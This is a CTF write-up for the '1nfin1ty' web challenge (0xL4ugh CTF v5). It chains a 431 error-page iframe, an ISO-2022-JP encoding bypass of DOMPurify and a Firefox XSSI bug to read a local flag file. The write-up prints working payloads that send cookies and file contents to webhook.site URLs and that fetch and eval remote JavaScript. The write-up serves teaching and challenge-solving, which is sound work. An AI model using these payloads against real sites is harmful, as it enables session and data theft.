---
title: "1nfin1ty — 0xL4ugh CTF v5"
description: "The complete 1nfin1ty writeup: browser error pages, encoding behavior, Firefox internals, and IndexedDB storage."
date: 2026-06-29
updated: 2026-09-30
category: CTF
event: 0xL4ugh CTF v5
cover: infinity
source:
  url: "https://github.com/ZeyadZonkorany/MY-CTF-CHALLENGES/blob/main/0xL4ugh/1nfin1ty.md"
  label: "View 1nfin1ty on GitHub"
tags: [web, browsers, encoding, dompurify, firefox]
draft: false
---

# - 1nfin1ty Web challenge ( 0xL4ugh CTF v5 )

We’re looking at a Note Taker app with a specific chain of command. 
We can submit URLs to an Admin, and that Admin has an endpoint to submit URLs to a Super Admin.

The target is ``/flag.txt``, located on the Super Admin’s local filesystem. Since the flag isn't in a simple note, we aren't just looking for an access control bypass we need to get like RCE or LFI.

Because the Super Admin is isolated, our path to the flag looks like this : **User $\rightarrow$ Admin $\rightarrow$ Super Admin $\rightarrow$ Flag**. 

The first instinct is to try XSS to hijack the Admin's session. However, the app is running the latest version of DOMPurify, make it difficult. 

If we can't easily steal the Admin's Cookie as its httponly
we have to force the Admin to act as our proxy. We need to trigger that ( **Admin-to-Super Admin** ) endpoint.

But wait to make the admin interact with the superadmin we need a key.
it must be provided within the header:

```js
  const accessHeader = req.headers['superadmin-access'];
  if (!accessHeader || accessHeader !== SUPERADMIN_ACCESS_KEY) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(403).send(accessDeniedTemplate);
  }
```
We reached a new obstacle we need to get the ``SUPERADMIN_ACCESS_KEY`` Let’s see exactly how it is set.

Checking the bot code, we see that the access key is set at the /access-key endpoint:
```js
    await page.setCookie({
      name: "SUPERADMIN_ACCESS_KEY",
      value: SUPERADMIN_ACCESS_KEY,
      domain: "1nfin1ty",
      path: "/access-key",
      httpOnly: false  
    });

```
The first thing that comes to mind is to find a way to grab the key from that endpoint.

But!!

The server uses ``.destroy`` for any incoming request the server forces to closes the socket so the client gets no HTTP reply (connection reset / empty response)
```js
.all("/*", (req, res) => res.socket.destroy())
  .use((err, req, res, next) => {
    res.socket.destroy();
  })
```
Based on our current analysis, we need to somehow reach that endpoint where the access key is set directly. 
As we know, the ``.destroy`` function is what stops us. Let's try to bypass it or find a way to access the endpoint

By default, each server has a limit in URL length, so for example, we might be able to use this limitation in our attempt to bypass the ``.destroy`` function

<img width="1199" height="380" alt="Screenshot From 2026-01-07 00-44-03" src="https://github.com/user-attachments/assets/9a6e4a16-114a-45cf-92af-e6af1adb6e28" />

The whole point is that when we make the **URL too long**, we force the server to throw a **431 Error page**. 
The trick here is that this **error** page usually comes with no **rules** , so we can run any **JS** we want and open any other **iframes** inside it without being **restricted**.

But the most important thing is that when we **iframe** this **431** page, it takes the ``same origin`` as the ``original site``. 
How ?? **Because the server itself is the one responding with that error for that specific domain. 
Since the browser sees the request went to the site and the site responded (even with an error), it treats the iframe as same-origin.**

This is huge because now we have an **iframe** that the browser **trusts** as being part of the site,This lets us to start attacking the **internal frames**.

Thats nice progress but now we need to make the bot do what we want we need like xss or somthing to force the bot to do what we want 
So lets return to our ``DOMPURIFY`` sanitization

when we look at the source code of sanitization 
lets take the ``/health`` endpoint we see that 

```js
    res.setHeader('Content-Type', 'text/html');
    res.end(html);
```    

First thing to notice that the response is ``text/html`` which can be bypassed by ``ISO-2022-JP``
you can read more through that research 

``https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/``

So As we know that every browser has its own charset we need to see our browser version and how it deals with the ``char-set``


```Dockerfile
RUN wget -q https://dl.google.com/linux/chrome/deb/pool/main/g/google-chrome-stable/google-chrome-stable_136.0.7103.59-1_amd64.deb \
    && apt-get update \
    && apt-get install -y ./google-chrome-stable_136.0.7103.59-1_amd64.deb \
    && rm google-chrome-stable_136.0.7103.59-1_amd64.deb \
    && rm -rf /var/lib/apt/lists/*
```

so its ``google-chrome-stable_136.0.7103.59-1_amd64.deb``

---------------------------------------------------------

**SO LETS GO! OUR FIRST PART TO SOLVE THE CHALLENGE STARTS HERE**

<img width="1054" height="392" alt="Screenshot From 2026-01-06 18-42-38" src="https://github.com/user-attachments/assets/f4d94ed2-b064-459c-8aed-894090177c91" />


To host this attack, we first establish two iframes: the first to trigger the 431 error and the second for execution. By using open() to target an iframe and load about:blank, 
the window inherits the origin of the current path, ensuring it remains scriptable and trusted. 
Since it shares the Same-Origin, we can bypass security restrictions to read sensitive data.

You have to pay close attention to how the **payload** is being encoded here and the **char-set**

```js
<html>
    <body>
        <iframe></iframe>
        <iframe></iframe>
        <script>
            async function main(){
                const target = "1nfin1ty";
                const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
                
                var iframe1 = document.getElementsByTagName('iframe')[0];
                var iframe2 = document.getElementsByTagName('iframe')[1];
                

                iframe1.src = "http://"+target+":3000/access-key/?" + "A".repeat(100000);
                await sleep(2000);

                // the base64 in atob
                //w = top.frames[0].open('');setTimeout(()=>{fetch(`https://webhook.site/25fb3ddf-e750-4801-95b8-f6c3c29292ad?${w.document.cookie}`)},1000)
                var payload = '<a id="\x1b$B"></a>\x1b(B<a id="><img src=x onerror=eval(atob(`dyA9IHRvcC5mcmFtZXNbMF0ub3BlbignJyk7c2V0VGltZW91dCgoKT0+e2ZldGNoKGBodHRwczovL3dlYmhvb2suc2l0ZS8yNWZiM2RkZi1lNzUwLTQ4MDEtOTViOC1mNmMzYzI5MjkyYWQ/JHt3LmRvY3VtZW50LmNvb2tpZX1gKX0sMTAwMCk=`))>"></a>';
                
                iframe2.src = "http://"+target+":3000/health?test=" + encodeURIComponent(payload);
                await sleep(2000);
            }
            main();
        </script>
    </body>
</html>
```

**And here it is our KEY**


<img width="579" height="365" alt="Screenshot From 2026-01-12 21-38-11" src="https://github.com/user-attachments/assets/7382bd82-fb7d-42ff-9fe1-6faba9b236d8" />

------------------------------------------------------------

SO now we have the **access key** so what now ?

looking at the note we see that the same way we bypassed the xss in endpoint /health

```js
  res.setHeader('Content-Type', 'text/html');
  res.end(responseHtml);
```

we will use the same teqnique to bypass the xss there BUT there is a problem there is **lenght limitaion** :(

```js
  const rawContent = req.body.content;

  if (rawContent && typeof rawContent !== 'string') {
    return res.send('Invalid content type.');
  }
  
  if (rawContent && rawContent.length > 75) {
    return res.send('Note content must be 75 characters or less.');
  }
```

To bypass that we will use ``eval(window.name)``

This happens because name is a special attribute that identifies the window or page itself. 
Even if the content changes, the page still retains the same name.

As you see there :

<img width="447" height="110" alt="Screenshot From 2026-01-12 22-10-07" src="https://github.com/user-attachments/assets/c0a0ff4d-59c4-4679-961e-f1b89b333420" />

And like that we hit an alert :

<img width="447" height="110" alt="Screenshot From 2026-01-12 22-10-01" src="https://github.com/user-attachments/assets/e7211092-7052-46f0-8b75-dbbf2a2618aa" />

So our payload will be like that :

```js
<a id="$B"></a>(B<a id="><svg onload=eval(window.name)>"></a>
```
So, what do we need now?

We have our access key, we have XSS, and we have the **url** submission functionality in the admin panel. 
But even after reaching it, how do we use it? 
Our goal is to get the flag, but the flag isn't in an admin note or anything similar—it's located directly within the superadmin's system files :(

**LETS EXAMINE THE SUPER ADMIN'S CODE AND WHAT IT HAS IN IT:**

Here as we see it uses firefox browser

```js
import express from "express";
import puppeteer from "puppeteer";

const server = express();
const SERVER_PORT = process.env.PORT || 1338;

async function visitPage(targetUrl) {
  let browserInstance;
  try {
    browserInstance = await puppeteer.launch({
      browser: "firefox",
      headless: true,
      userDataDir: '/tmp/browser-files',
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH,
      pipe: true,
      firefoxUserPrefs: {
        'security.fileuri.strict_origin_policy': true,
      },
    });
```

And it uses the version ``firefox@stable_138.0.4``

```Dockerfile
FROM node:20 as puppeteer
ENV PUPPETEER_SKIP_DOWNLOAD=true
ENV PUPPETEER_CACHE_DIR=/home/node/puppeteer_cache

WORKDIR /home/node/
COPY package.json /home/node/
RUN apt-get update && apt-get install xz-utils -y
RUN npm i && npx puppeteer browsers install firefox@stable_138.0.4
```

looking at this we can find that there is an issue reported in here by ``terjanq``
``https://bugzilla.mozilla.org/show_bug.cgi?id=1960745``

which is talking about **Intercepting console errors might lead to XSSI**

**SO What is XSSI?**
XSSI is a way to steal data from another website by forcing it to load as a script. Since <script> tags don't follow the "Same-Origin Policy," an attacker can link to a private file on another site.

**Stealing Data via Error Messages :(**.
If the file you are targeting isn't a valid JavaScript file (like a secret text file or a CSV), the browser will try to read it as code that will lead to fail, and then it will throw an error
We can get the data inside that file by catching the error message. 

**The error message often contains the actual content of the file that caused the crash.**.
SO what now !!
cached files is stored as plaintext in user directory which in was there

``/tmp/firefox-userdata``

```js
 let browserInstance;
  try {
    browserInstance = await puppeteer.launch({
      browser: "firefox",
      headless: true,
      userDataDir: '/tmp/firefox-userdata',
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH,
      pipe: true,
      firefoxUserPrefs: {
        'security.fileuri.strict_origin_policy': true,
      },
    });
```
So now with the XSS we got, we will host our payload. 
The payload here will trigger the errors in utf16 for the files we want then decode it and then it will send the content to our webhook.

```js
async function saveBlob(dbName, storeName, key, blob) {
  const db = await new Promise((resolve, reject) => {
    const request = indexedDB.open(dbName, 1);
    request.onupgradeneeded = () => request.result.createObjectStore(storeName);
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
  const tx = db.transaction(storeName, 'readwrite');
  tx.objectStore(storeName).put(blob, key);
  await tx.done;
  db.close();
}

const myBlob = new Blob([`
<!DOCTYPE html>
<html>
    <head>
        <script>
            Object.defineProperty(ReferenceError.prototype, 'name', {
                get() {
                    const flag = this.message.toString();
                    const transformed = flag.replace(/./g, function(c) {
                        const charCode = c.charCodeAt(0);
                        return String.fromCharCode(charCode >> 8, charCode & 0xff);
                    });

                    navigator.sendBeacon('https://webhook.site/f8a77ba6-c179-4090-88a0-a4a0534ffb26', transformed);
                    return 'WASDWASD';
                },
            });
        </script>
    </head>
    <body>
        <script src="file:///flag.txt" charset="utf-16be"></script>
    </body>
</html>
`], { type: 'text/html' });

saveBlob('myDB', 'files', 'file1', myBlob)
  .then(() => console.log('Blob saved!'))
  .catch(err => console.error(err));
```

<img width="1314" height="593" alt="Screenshot From 2026-01-13 01-34-58" src="https://github.com/user-attachments/assets/fe37ac61-8c1e-42da-aefd-26a29849372d" />

In our script here inside the ``window.name`` the header is set with the ``'SuperAdmin-Access': 'SuperSecretAccessKey456'`` to be able to make the admin to submit to the superadmin panel the url.
And the first url we will use is that we are hosting our ``xssI`` payload

The url have **js parameter**
The **js parameter** is vulnerable and allows direct execution of JavaScript code.
Using this, we can load a remote JavaScript file and execute it in the page context.

The following URL fetches our hosted payload and executes it:

``https://url/xss.php?js=fetch('https://gist.githubusercontent.com/zox/32181ae8da2ed8b76fae6frb63813390/raw/7fb8bf95c2447350e4b38b30135667ace3044acb/exploit.js').then(r=>r.text()).then(eval)``


When the page is visited, the browser downloads the payload

```html
<!DOCTYPE html>
<html>
<body>
    <script>
        window.name = `
            fetch('/admin', {
                method: 'POST',
                headers: {
                    'SuperAdmin-Access': 'SuperSecretAccessKey456',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: 'url=First-urlHere'
            })
            .then(r => r.text())
            .then(html => {
                document.open();
                document.write(html);
                document.close();
            });
        `;

        setTimeout(() => {
            window.location = 'http://localhost:3000/admin/view-note?note_id=xxxx';
        }, 500);
    </script>
</body>
</html>
```
The next step is identifying the path where our payload is saved on the server

Lets examine the Docker .
The command creates a directory and gives it full permissions:

``RUN mkdir -p /tmp/browser-files && chmod 777 /tmp/browser-files``

Firefox stores site data (IndexedDB, LocalStorage, Cache,....) under the profile directory ``storage/default/``
Each site gets its own folder, and the folder name is derived from the site’s origin and browsing context, not generated randomly.

A directory like:
``https+++zox^userContextId=6``

<img width="679" height="182" alt="Screenshot From 2026-01-14 00-17-48" src="https://github.com/user-attachments/assets/4790058d-2bdd-4b3d-8aa3-a33d9a51feb0" />

represents the origin ``https://zox``
Firefox replaces the ``://`` in the URL with ``+++`` to make the name filesystem-safe, so ``https://zox`` becomes ``https+++zox``

The ``^userContextId=6`` part is an origin attribute indicating that this storage belongs to Firefox Container (context) ID 6. 
The numeric value is an internal container ID assigned by Firefox and is not random.

Inside that directory, IndexedDB data lives under the ``idb/`` folder. Database files may look random, for example:
``2774579512mByD.sqlite``

<img width="837" height="174" alt="Screenshot From 2026-01-14 00-21-17" src="https://github.com/user-attachments/assets/6c722a70-79f9-4813-b4e4-3dd5ccb57f88" />

The IndexedDB database filename is not random. Firefox generates it deterministically from the database name. 
It first computes a numeric hash of the name, which becomes the leading digits of the filename. 
Then it appends a scrambled version of the database name by taking characters alternately from the start and the end. For example, a database named myDB becomes mByD, resulting in a filename like ``2774579512mByD.sqlite``

Finaly our payload is always saved in file ``1``

<img width="1001" height="119" alt="Screenshot From 2026-01-14 00-27-58" src="https://github.com/user-attachments/assets/905c5d0c-8949-4bd1-914d-8ae8ccb47fd0" />



**Note**: The randomness may vary a liitle bit so some debugging may be required to understand how it works and determine the correct values.

```html
<!DOCTYPE html>
<html>
<body>
    <script>
        window.name = `
            fetch('/admin', {
                method: 'POST',
                headers: {
                    'SuperAdmin-Access': 'SuperSecretAccessKey456',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: 'url=file:///tmp/browser-files/storage/default/https+++couldbeAnyThing^userContextId=6/idb/2774579512mByD.files/1'
            })
            .then(r => r.text())
            .then(html => {
                document.open();
                document.write(html);
                document.close();
            });
        `;

        setTimeout(() => {
            window.location = 'http://localhost:3000/admin/view-note?note_id=xxxxxx';
        }, 500);
    </script>
</body>
</html>
```

--------------
Refrences :
---
``https://searchfox.org/firefox-main/source/caps/OriginAttributes.h``
``https://dimas0305.notion.site/Bypassing-null-Origin-in-4xx-Status-Code-Using-Iframe-disconnection-revenge-Writeup-AlpacaHack-R-14e48583e65d80e6b8d5c53f07905d97``
``https://stackoverflow.com/questions/65448110/where-are-the-data-for-extension-storage-of-a-firefox-extension-stored-in``
``https://bugzilla.mozilla.org/show_bug.cgi?id=1960745``

``https://wh0.github.io/2025/05/30/rsegmnoittet-es.html``
``https://github.com/google/google-ctf/tree/main/2025/quals/web-sourceless``
